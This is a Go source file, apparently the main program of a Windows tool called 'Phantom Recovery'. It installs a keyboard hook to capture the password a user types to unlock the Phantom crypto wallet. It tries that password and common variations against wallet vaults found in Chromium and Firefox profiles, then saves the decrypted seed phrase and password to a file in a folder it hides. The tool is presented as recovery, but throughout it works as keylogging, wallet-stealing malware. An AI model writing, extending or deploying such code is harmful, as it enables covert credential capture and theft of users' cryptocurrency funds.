//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"phantom-recovery/internal/browser"
	"phantom-recovery/internal/hook"
	"phantom-recovery/internal/phantom"
	"phantom-recovery/internal/types"
)

func main() {
	fmt.Println("========================================")
	fmt.Println("  Phantom Recovery -- waiting for unlock")
	fmt.Println("  Press Ctrl+C to exit")
	fmt.Println("========================================")
	fmt.Println()

	debug := os.Getenv("EXODUS_DEBUG") == "1"
	hook.LogFunc = makeLogger(debug)
	phantom.LogFunc = makeLogger(debug)
	browser.LogFunc = makeLogger(debug)

	chromiumVaults := phantom.FindVaults()
	firefoxVaults := phantom.FindFirefoxVaults()
	allVaults := len(chromiumVaults) + len(firefoxVaults)
	fmt.Printf("[*] Found %d Phantom vault(s)\n", allVaults)
	for _, v := range chromiumVaults {
		fmt.Printf("    - %s / %s  (%s)\n", v.Browser, v.Profile, v.Path)
	}
	fmt.Println()

	eventChan := hook.Start()
	defer hook.Stop()
	fmt.Println("[*] Keyboard hook installed -- waiting for Phantom unlock...")
	fmt.Println()

	recentAttempts := make(map[string]time.Time)

	for {
		evt, ok := <-eventChan
		if !ok {
			fmt.Println("[!] Hook channel closed -- exiting")
			return
		}

		password := evt.Password

		if t, ok := recentAttempts[password]; ok {
			if time.Now().Before(t.Add(5 * time.Minute)) {
				continue
			}
		}
		recentAttempts[password] = time.Now()

		if len(recentAttempts) > 5000 {
			cutoff := time.Now().Add(-5 * time.Minute)
			for k, t := range recentAttempts {
				if t.Before(cutoff) {
					delete(recentAttempts, k)
				}
			}
		}

		if len(password) == 0 {
			continue
		}
		if len(password) > 200 {
			continue
		}

		if evt.Source != "phantom" {
			continue
		}

		fmt.Printf("[*] Password captured [phantom, %d chars] -- trying vaults...\n", len(password))
		passwords := generateVariations(password)
		results := phantom.TryExtract(passwords)
		ffResults := phantom.TryExtractFirefox(passwords)
		results = append(results, ffResults...)
		for _, r := range results {
			fmt.Println()
			fmt.Println("[+] ========================================")
			fmt.Println("[+] PHANTOM SEED CAPTURED")
			fmt.Printf("[+] Source: %s\n", r.Location)
			fmt.Println("[+] ========================================")
			fmt.Println()
			saveRecoveryFile(r)
		}
		if len(results) == 0 {
			fmt.Println("[-] No vaults decrypted with this password")
		}
	}
}

func saveRecoveryFile(result types.WalletResult) {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		fmt.Println("[!] Cannot determine user profile directory")
		return
	}

	baseDir := ""
	for _, cand := range []string{
		filepath.Join(userProfile, "Desktop"),
		filepath.Join(userProfile, "Documents"),
		userProfile,
	} {
		if info, err := os.Stat(cand); err == nil {
			if info.IsDir() {
				baseDir = cand
				break
			}
		}
	}

	outputDir := filepath.Join(baseDir, "PhantomRecovery")
	os.MkdirAll(outputDir, 0700)
	hideDirectory(outputDir)

	timestamp := time.Now().Format("2006-01-02_150405")
	filename := fmt.Sprintf("phantom_seed_%s.txt", timestamp)
	fullPath := filepath.Join(outputDir, filename)

	var sb strings.Builder
	sb.WriteString("========================================\n")
	sb.WriteString("       PHANTOM WALLET RECOVERY\n")
	sb.WriteString("========================================\n")
	sb.WriteString("\n")
	sb.WriteString(fmt.Sprintf("SEED PHRASE: %s\n", result.Mnemonic))
	sb.WriteString("\n")
	sb.WriteString(fmt.Sprintf("SEED PHRASE: %s\n", result.Mnemonic))
	if result.Password != "" {
		sb.WriteString(fmt.Sprintf("PASSWORD:    %s\n", result.Password))
		sb.WriteString("\n")
	}
	sb.WriteString(fmt.Sprintf("SOURCE:      %s\n", result.Location))
	sb.WriteString(fmt.Sprintf("TIMESTAMP:   %s\n", time.Now().Format("2006-01-02 15:04:05")))
	sb.WriteString("\n")
	sb.WriteString("========================================\n")

	if err := os.WriteFile(fullPath, []byte(sb.String()), 0600); err != nil {
		fmt.Printf("[!] Failed to save recovery file: %v\n", err)
		return
	}

	fmt.Printf("[+] Recovery file saved to:\n")
	fmt.Printf("    %s\n", fullPath)

	go func() {
		exec.Command("explorer", "/select,", fullPath).Start()
	}()
}

func hideDirectory(path string) {
	cmd := exec.Command("attrib", "+h", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func generateVariations(password string) []string {
	seen := make(map[string]bool)
	var variations []string

	add := func(p string) {
		if p != "" && !seen[p] {
			seen[p] = true
			variations = append(variations, p)
		}
	}

	add(password)
	add(strings.ToLower(password))

	if len(password) > 0 {
		add(strings.ToUpper(password[:1]) + strings.ToLower(password[1:]))
	}

	add(strings.ToUpper(password))
	stripped := strings.TrimRight(password, "0123456789")
	add(stripped)

	for _, suffix := range []string{"1", "!", "123", "1234"} {
		add(password + suffix)
	}

	if len(variations) > 10 {
		variations = variations[:10]
	}
	return variations
}

func makeLogger(enabled bool) func(tag, format string, args ...interface{}) {
	if !enabled {
		return func(tag, format string, args ...interface{}) {}
	}
	return func(tag, format string, args ...interface{}) {
		msg := fmt.Sprintf(format, args...)
		fmt.Printf("[%s] %s\n", tag, msg)
	}
}



